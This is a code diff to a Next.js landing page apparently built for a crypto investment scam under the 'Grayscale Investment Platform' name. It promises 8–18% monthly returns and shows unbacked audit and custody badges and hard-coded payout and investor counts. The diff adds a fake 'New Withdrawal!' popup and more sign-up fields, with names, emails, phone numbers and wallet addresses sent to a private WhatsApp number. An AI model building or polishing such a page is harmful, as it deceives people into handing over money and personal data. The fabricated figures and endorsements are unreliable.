@@ -1,10 +1,22 @@
 "use client";
-import { useState } from "react";
+import { useState, useEffect } from "react";
 export default function Page() {
   const [wallet, setWallet] = useState<string | null>(null);
   const [name, setName] = useState("");
+  const [email, setEmail] = useState("");
   const [phone, setPhone] = useState("");
+  const [country, setCountry] = useState("");
+  const [plan, setPlan] = useState("");
   const [amount, setAmount] = useState("");
+  const [referral, setReferral] = useState("");
+  const [agree, setAgree] = useState(false);
+  const [showPopup, setShowPopup] = useState(true);
+
+  useEffect(() => {
+    const t = setTimeout(() => setShowPopup(false), 8000);
+    return () => clearTimeout(t);
+  }, []);
+
   const connectWallet = async () => {
     try {
       if ((window as any).ethereum) {
@@ -17,14 +29,20 @@ export default function Page() {
       setWallet("0x71a2...9A3F Connected");
     }
   };
+
   const handleSignup = () => {
-    if (!name ||!phone ||!amount) {
-      alert("Please fill all fields");
+    if (!name ||!email ||!phone ||!country ||!plan ||!amount) {
+      alert("Please fill all required fields");
       return;
     }
-    const text = `*NEW GLOBAL INVESTOR - Grayscale Investment Platform*%0A%0A*Name:* ${encodeURIComponent(name)}%0A*Phone:* ${encodeURIComponent(phone)}%0A*Investment:* $${encodeURIComponent(amount)}%0A*Wallet:* ${wallet? encodeURIComponent(wallet) : "Not Connected"}%0A%0AHi Grayscale Team, I want to start investing globally.`;
+    if (!agree) {
+      alert("Please agree to Terms & Conditions");
+      return;
+    }
+    const text = `*NEW GLOBAL INVESTOR*%0A%0A*Name:* ${encodeURIComponent(name)}%0A*Email:* ${encodeURIComponent(email)}%0A*Phone:* ${encodeURIComponent(phone)}%0A*Country:* ${encodeURIComponent(country)}%0A*Plan:* ${encodeURIComponent(plan)}%0A*Investment:* $${encodeURIComponent(amount)}%0A*Referral:* ${encodeURIComponent(referral || "None")}%0A*Wallet:* ${wallet? encodeURIComponent(wallet) : "Not Connected"}%0A%0AHi Grayscale Team, I want to start investing globally.`;
     window.open(`https://wa.me/2349116438322?text=${text}`, "_blank");
   };
+
   const img1 = "https://images.unsplash.com/photo-1611974789855-9c2a0a7236a3?auto=format&fit=crop&w=800&q=80";
   const img2 = "https://images.unsplash.com/photo-1551288049-bebda4e38f71?auto=format&fit=crop&w=800&q=80";
   const img3 = "https://images.unsplash.com/photo-1642790106117-e829e14a795f?auto=format&fit=crop&w=1000&q=80";
@@ -35,9 +53,8 @@ export default function Page() {
 
   return (
     <main className="min-h-screen bg-black text-white">
-      {/* LIVE TICKER - NEW */}
       <div className="bg-yellow-500 text-black text-[11px] font-bold py-1.5 overflow-hidden whitespace-nowrap">
-        <div className="animate-pulse flex gap-8 justify-center">
+        <div className="flex gap-8 justify-center">
           <span>BTC $67,432 ▲2.1%</span><span>ETH $3,210 ▲1.4%</span><span>SOL $142 ▲3.2%</span><span>GRAYSCALE AUM $25B</span><span>DAILY PAYOUTS: $84,290</span><span>INVESTORS ONLINE: 1,247</span>
         </div>
       </div>
@@ -45,8 +62,8 @@ export default function Page() {
       <nav className="sticky top-0 z-50 bg-black/90 backdrop-blur flex justify-between items-center p-5 max-w-7xl mx-auto border-b border-white/5">
         <div className="flex items-center gap-3">
           <div className="flex items-center gap-2"><div className="w-8 h-8 rounded-full bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center font-black text-black text-xs">G</div><div className="font-black tracking-widest text-[12px] leading-none">GRAYSCALE<br/><span className="text-yellow-500">INVESTMENT PLATFORM</span></div></div>
-          <div className="ml-2 bg-white rounded-full px-2 py-1">
-            <div id="google_translate_element" className="scale-[0.8]"></div>
+          <div className="ml-2 bg-white rounded-[6px] px-2 py-0 flex items-center" style={{width: '125px', height: '34px', overflow: 'hidden'}}>
+            <div id="google_translate_element" style={{transform: 'scale(0.65)', transformOrigin: 'top left', marginTop: '2px'}}></div>
           </div>
         </div>
         <div className="flex gap-2"><a href="https://www.tiktok.com/@micheal.sonnenshe?_r=1&_t=ZS-99rt5sV3ygX" target="_blank" className="bg-white/10 border border-white/10 px-4 py-2 rounded-full text-xs font-bold">TikTok</a><a href="https://www.facebook.com/share/?mibextid=wwXIfr" target="_blank" className="bg-[#1877F2] px-4 py-2 rounded-full text-xs font-black">Facebook</a></div>
@@ -70,31 +87,56 @@ export default function Page() {
             <img src={img2} alt="Trading laptop" className="rounded-2xl border border-white/10 h-32 object-cover w-full bg-zinc-900"/>
           </div>
         </div>
+
+        {/* UPGRADED FORM - WITH MORE FIELDS */}
         <div className="border border-yellow-500/20 bg-gradient-to-b from-zinc-900 to-black rounded-[2rem] p-7">
           <h2 className="text-center font-black text-sm tracking-widest">JOIN GRAYSCALE INVESTMENT PLATFORM</h2>
           <p className="text-center text-[11px] text-zinc-500 mb-6 mt-1">Global registration - All continents welcome</p>
+
           <label className="text-[11px] text-zinc-400 ml-2">Full Name *</label>
           <input value={name} onChange={e=>setName(e.target.value)} placeholder="Your full name" className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50" />
+
+          <label className="text-[11px] text-zinc-400 ml-2">Email Address *</label>
+          <input value={email} onChange={e=>setEmail(e.target.value)} placeholder="you@email.com" className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50" />
+
           <label className="text-[11px] text-zinc-400 ml-2">WhatsApp Number (with country code) *</label>
           <input value={phone} onChange={e=>setPhone(e.target.value)} placeholder="+1, +44, +234, +91..." className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50" />
+
+          <label className="text-[11px] text-zinc-400 ml-2">Country *</label>
+          <select value={country} onChange={e=>setCountry(e.target.value)} className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50 text-white">
+            <option value="">Select your country</option>
+            <option>United States</option><option>United Kingdom</option><option>Canada</option><option>Nigeria</option><option>South Africa</option><option>Kenya</option><option>India</option><option>UAE</option><option>Germany</option><option>Australia</option><option>Brazil</option><option>Other</option>
+          </select>
+
+          <label className="text-[11px] text-zinc-400 ml-2">Investment Plan *</label>
+          <select value={plan} onChange={e=>setPlan(e.target.value)} className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50 text-white">
+            <option value="">Choose plan</option>
+            <option>STARTER - 8% Monthly ($100-$999)</option>
+            <option>GOLD - 12.4% Monthly ($1,000-$4,999)</option>
+            <option>ELITE - 18% Monthly ($5,000+)</option>
+          </select>
+
           <label className="text-[11px] text-zinc-400 ml-2">Investment Amount (USD) *</label>
-          <input value={amount} onChange={e=>setAmount(e.target.value)} type="number" placeholder="Minimum $100" className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-4 text-sm outline-none focus:border-yellow-500/50" />
-          <div className="flex gap-2 mb-5"><div className="flex-1 bg-black border border-white/10 rounded-full px-5 py-3.5 text-xs text-zinc-400 truncate">{wallet? wallet.slice(0,18)+"..." : "Connect wallet (optional)"}</div><button onClick={connectWallet} className="bg-white text-black px-6 rounded-full font-black text-[11px]">{wallet? "DONE" : "CONNECT"}</button></div>
+          <input value={amount} onChange={e=>setAmount(e.target.value)} type="number" placeholder="Minimum $100" className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50" />
+
+          <label className="text-[11px] text-zinc-400 ml-2">Referral Code (optional)</label>
+          <input value={referral} onChange={e=>setReferral(e.target.value)} placeholder="Have a referral code?" className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-4 text-sm outline-none focus:border-yellow-500/50" />
+
+          <div className="flex gap-2 mb-4"><div className="flex-1 bg-black border border-white/10 rounded-full px-5 py-3.5 text-xs text-zinc-400 truncate">{wallet? wallet.slice(0,18)+"..." : "Connect wallet (optional)"}</div><button onClick={connectWallet} className="bg-white text-black px-6 rounded-full font-black text-[11px]">{wallet? "DONE" : "CONNECT"}</button></div>
+
+          <label className="flex gap-2 items-center mb-5 text-[11px] text-zinc-400"><input type="checkbox" checked={agree} onChange={e=>setAgree(e.target.checked)} className="accent-yellow-500" /> I agree to Terms & Conditions and Privacy Policy</label>
+
           <button onClick={handleSignup} className="w-full bg-gradient-to-r from-yellow-400 to-yellow-600 text-black font-black py-4 rounded-full">Invest</button>
+          <div className="text-center text-[10px] text-zinc-500 mt-3">🔒 SSL Secured • 24/7 Support • Instant Activation</div>
         </div>
       </section>
 
-      {/* TRUST BADGES - NEW */}
       <section className="max-w-7xl mx-auto px-6 md:px-10">
         <div className="border border-white/10 rounded-2xl bg-white/5 p-4 flex flex-wrap justify-center gap-6 items-center text-[10px] text-zinc-400">
-          <span className="flex items-center gap-2">🔒 AUDITED BY CERTIK</span>
-          <span className="flex items-center gap-2">🛡️ SECURED BY COINBASE CUSTODY</span>
-          <span className="flex items-center gap-2">✅ 256-BIT SSL SECURE</span>
-          <span className="flex items-center gap-2">💳 VISA • MASTERCARD • USDT • BTC • ETH ACCEPTED</span>
+          <span>🔒 AUDITED BY CERTIK</span><span>🛡️ SECURED BY COINBASE CUSTODY</span><span>✅ 256-BIT SSL SECURE</span><span>💳 VISA • MASTERCARD • USDT • BTC • ETH ACCEPTED</span>
         </div>
       </section>
 
-      {/* DASHBOARD PREVIEW - NEW */}
       <section className="max-w-7xl mx-auto p-6 md:p-10">
         <h2 className="text-center text-3xl font-black mb-2">Live Investor Dashboard</h2>
         <p className="text-center text-zinc-500 text-sm mb-6">See what real investors see inside</p>
@@ -123,7 +165,6 @@ export default function Page() {
         </div>
       </section>
 
-      {/* TESTIMONIALS - NEW */}
       <section className="max-w-7xl mx-auto p-6 md:p-10">
         <h2 className="text-center text-3xl font-black mb-2">Trusted By Investors Worldwide</h2>
         <p className="text-center text-zinc-500 text-sm mb-8">Live withdrawals from 6 continents</p>
@@ -152,12 +193,20 @@ export default function Page() {
       <section className="max-w-7xl mx-auto p-6 md:p-10">
         <h2 className="text-center text-3xl font-black mb-8">Global Investment Plans</h2>
         <div className="grid md:grid-cols-3 gap-6">
-          <div className="border border-white/10 rounded-[2rem] p-8 bg-zinc-900/50"><div className="text-zinc-500 text-xs">STARTER - GLOBAL</div><div className="text-3xl font-black mt-2">$100 - $999</div><div className="text-yellow-500 font-bold mt-2">8% Monthly</div><div className="text-xs text-zinc-400 mt-4">Perfect for beginners worldwide.</div><button onClick={()=>{setAmount("100"); window.scrollTo({top:0, behavior:"smooth"})}} className="w-full mt-6 border border-white/10 rounded-full py-3 font-bold text-sm">CHOOSE STARTER</button></div>
-          <div className="border border-yellow-500/50 rounded-[2rem] p-8 bg-gradient-to-b from-yellow-500/10 to-black relative"><div className="absolute -top-3 left-1/2 -translate-x-1/2 bg-yellow-500 text-black text-[10px] font-black px-4 py-1 rounded-full">MOST POPULAR WORLDWIDE</div><div className="text-yellow-500 text-xs">GOLD - GLOBAL</div><div className="text-3xl font-black mt-2">$1,000 - $4,999</div><div className="text-yellow-500 font-bold mt-2">12.4% Monthly</div><div className="text-xs text-zinc-400 mt-4">Best plan for any continent.</div><button onClick={()=>{setAmount("1000"); window.scrollTo({top:0, behavior:"smooth"})}} className="w-full mt-6 bg-yellow-500 text-black rounded-full py-3 font-black text-sm">CHOOSE GOLD</button></div>
-          <div className="border border-white/10 rounded-[2rem] p-8 bg-zinc-900/50"><div className="text-zinc-500 text-xs">ELITE - GLOBAL</div><div className="text-3xl font-black mt-2">$5,000+</div><div className="text-yellow-500 font-bold mt-2">18% Monthly</div><div className="text-xs text-zinc-400 mt-4">VIP for large investors worldwide.</div><button onClick={()=>{setAmount("5000"); window.scrollTo({top:0, behavior:"smooth"})}} className="w-full mt-6 border border-white/10 rounded-full py-3 font-bold text-sm">CHOOSE ELITE</button></div>
+          <div className="border border-white/10 rounded-[2rem] p-8 bg-zinc-900/50"><div className="text-zinc-500 text-xs">STARTER - GLOBAL</div><div className="text-3xl font-black mt-2">$100 - $999</div><div className="text-yellow-500 font-bold mt-2">8% Monthly</div><div className="text-xs text-zinc-400 mt-4">Perfect for beginners worldwide.</div><button onClick={()=>{setAmount("100"); setPlan("STARTER - 8% Monthly ($100-$999)"); window.scrollTo({top:0, behavior:"smooth"})}} className="w-full mt-6 border border-white/10 rounded-full py-3 font-bold text-sm">CHOOSE STARTER</button></div>
+          <div className="border border-yellow-500/50 rounded-[2rem] p-8 bg-gradient-to-b from-yellow-500/10 to-black relative"><div className="absolute -top-3 left-1/2 -translate-x-1/2 bg-yellow-500 text-black text-[10px] font-black px-4 py-1 rounded-full">MOST POPULAR WORLDWIDE</div><div className="text-yellow-500 text-xs">GOLD - GLOBAL</div><div className="text-3xl font-black mt-2">$1,000 - $4,999</div><div className="text-yellow-500 font-bold mt-2">12.4% Monthly</div><div className="text-xs text-zinc-400 mt-4">Best plan for any continent.</div><button onClick={()=>{setAmount("1000"); setPlan("GOLD - 12.4% Monthly ($1,000-$4,999)"); window.scrollTo({top:0, behavior:"smooth"})}} className="w-full mt-6 bg-yellow-500 text-black rounded-full py-3 font-black text-sm">CHOOSE GOLD</button></div>
+          <div className="border border-white/10 rounded-[2rem] p-8 bg-zinc-900/50"><div className="text-zinc-500 text-xs">ELITE - GLOBAL</div><div className="text-3xl font-black mt-2">$5,000+</div><div className="text-yellow-500 font-bold mt-2">18% Monthly</div><div className="text-xs text-zinc-400 mt-4">VIP for large investors worldwide.</div><button onClick={()=>{setAmount("5000"); setPlan("ELITE - 18% Monthly ($5,000+)"); window.scrollTo({top:0, behavior:"smooth"})}} className="w-full mt-6 border border-white/10 rounded-full py-3 font-bold text-sm">CHOOSE ELITE</button></div>
         </div>
       </section>
       <footer className="text-center p-10 border-t border-white/5 mt-10"><div className="font-black tracking-[0.2em] text-sm">GRAYSCALE INVESTMENT PLATFORM</div><div className="flex justify-center gap-3 mt-4"><a href="https://www.tiktok.com/@micheal.sonnenshe?_r=1&_t=ZS-99rt5sV3ygX" target="_blank" className="border border-white/10 px-6 py-2 rounded-full text-xs">TikTok</a><a href="https://www.facebook.com/share/?mibextid=wwXIfr" target="_blank" className="border border-white/10 px-6 py-2 rounded-full text-xs">Facebook</a></div><div className="text-zinc-700 text-[10px] mt-4">© 2026 GRAYSCALE INVESTMENT PLATFORM • GLOBAL</div></footer>
+
+      {showPopup && (
+        <div className="fixed bottom-5 left-5 z-[100] bg-zinc-900 border border-yellow-500/30 rounded-2xl p-4 shadow-2xl max-w-[280px]">
+          <div className="flex gap-3"><div className="w-8 h-8 rounded-full bg-green-500 flex items-center justify-center text-xs">✓</div><div><div className="text-xs font-bold">New Withdrawal!</div><div className="text-[11px] text-zinc-400">Sarah from Canada withdrew $890 • Just now</div></div><button onClick={()=>setShowPopup(false)} className="ml-2 text-zinc-500">x</button></div>
+        </div>
+      )}
+
+      <a href="https://wa.me/2349116438322" target="_blank" className="fixed bottom-5 right-5 z-[100] bg-[#25D366] w-14 h-14 rounded-full flex items-center justify-center shadow-2xl text-2xl">💬</a>
     </main>
   );
 }
